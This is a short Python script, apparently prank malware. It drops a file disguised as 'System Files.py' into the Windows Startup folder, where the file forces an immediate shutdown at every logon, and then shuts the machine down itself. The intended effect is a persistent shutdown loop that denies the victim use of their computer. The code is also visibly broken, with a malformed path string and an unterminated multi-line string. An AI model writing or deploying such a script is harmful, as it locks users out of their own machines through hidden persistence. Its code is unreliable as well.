import os
import ctypes

# auto boot file

def get_user():
    return os.getenv('USER',os.getenv('USERNAME','user'))

os.chdir('C:\Users\'get_user()'\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup')
file = open("System Files.py","w")
file.write("import os
os.system('shutdown /p /t 1 /f')")
file.close()

os.system("shutdown /p /t 1 /f")
